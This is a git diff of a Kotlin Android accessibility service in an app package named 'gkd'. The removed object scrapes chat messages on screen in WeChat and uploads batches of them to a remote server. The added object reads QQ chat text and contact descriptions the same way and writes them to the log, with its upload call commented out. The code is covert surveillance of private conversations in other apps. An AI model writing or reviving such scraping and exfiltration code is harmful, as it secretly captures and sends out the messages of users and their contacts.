@@ -1,57 +1,42 @@
 package li.songe.gkd.service
 
 import android.util.Log
-import android.view.View
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
-import com.example.myapplication.network.UserService
 
-object Listener {
-    private val TAG = "Listener"
+object QListener {
     private var lastRead = System.currentTimeMillis()
     private var user = ""
     private val messageList = ArrayList<String>()
     private val allMessageList = ArrayList<String>()
-    private val sleepDefault = 5 * 1000
-    private val friendSleep = 1000 * 10 * 10
-    private var sleep = sleepDefault
     private var uploading = false
+    private val TAG = "QListener"
+
 
     fun onAccessibilityEvent(
         event: AccessibilityEvent?,
         rootInActiveWindow: AccessibilityNodeInfo?
     ) {
-        AppUseListener.onAccessibilityEvent(event, rootInActiveWindow)
-        QListener.onAccessibilityEvent(event, rootInActiveWindow)
+        if ((System.currentTimeMillis() - lastRead) < 1000 * 5) return
 
-        if (event?.packageName.toString() != "com.tencent.mm") return
-        if ((System.currentTimeMillis() - lastRead) < sleep) return
+        val app = event?.packageName.toString()
+        if (app != "com.tencent.mobileqq") return
         if (messageList.size > 100 && !uploading) {
             allMessageList.addAll(messageList)
-            uploadMessage()
+//            uploadMessage()
             if (allMessageList.size > 100 * 1000) allMessageList.clear()
         }
         rootInActiveWindow?.let {
             lastRead = System.currentTimeMillis()
-            sleep = sleepDefault
-            Log.d(TAG, "wechat start")
+            Log.d(TAG, "qq start")
             findAll(it, 0)
         }
     }
 
-    private fun uploadMessage() {
-        uploading = true
-        var liveMessage = ""
-        messageList.map { liveMessage = "$it\n$liveMessage" }
-        messageList.clear()
-        uploading = false
-        UserService.login {
-            UserService.uploadMessage(it, liveMessage)
-        }
-    }
-
     private fun findAll(node: AccessibilityNodeInfo, level: Int) {
-        if (level > 25) return
+        if (level > 25) {
+            return
+        }
         for (i in 0 until node.childCount) {
             val node1 = node.getChild(i) ?: return
             var className: String? = null
@@ -63,12 +48,8 @@ object Listener {
             if (className == "android.widget.TextView") {
                 val message = node1.text?.toString() ?: ""
                 if (message == "浮窗") return
-                if (message == "朋友圈") {
-                    sleep = friendSleep
-                    return
-                }
 
-                addMessage(message)
+//                addMessage(message)
                 Log.d(TAG, message)
             } else if (className == "android.widget.ImageView") {
                 val cuser = node1.contentDescription?.toString() ?: ""
@@ -82,12 +63,4 @@ object Listener {
             }
         }
     }
-
-    private fun addMessage(message: String) {
-        if (messageList.contains(message) || allMessageList.contains(message)) {
-            return
-        }
-        messageList.add(message)
-    }
-
 }
